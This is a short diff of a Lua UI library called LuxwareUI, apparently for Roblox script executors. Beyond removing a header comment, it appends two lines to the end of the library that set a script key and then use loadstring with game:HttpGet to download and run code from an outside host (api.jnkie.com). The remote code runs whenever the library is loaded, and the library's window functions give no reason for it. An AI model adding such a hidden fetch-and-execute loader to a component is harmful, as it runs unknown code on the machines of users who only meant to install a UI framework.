@@ -1,5 +1,3 @@
--- [[ LuxwareUI Framework | Premium AMOLED Monochromatic Polished ]] --
-
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
@@ -798,5 +796,8 @@ function Luxware:CreateWindow(options)
 
     return WindowAPI
 end
+
+getgenv().SCRIPT_KEY = "KEYLESS"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/872389988f3e224fcc9b5eb9d4351bc650ec020c49edfa5d90b09f0d3add975c/download"))()
 
 return Luxware
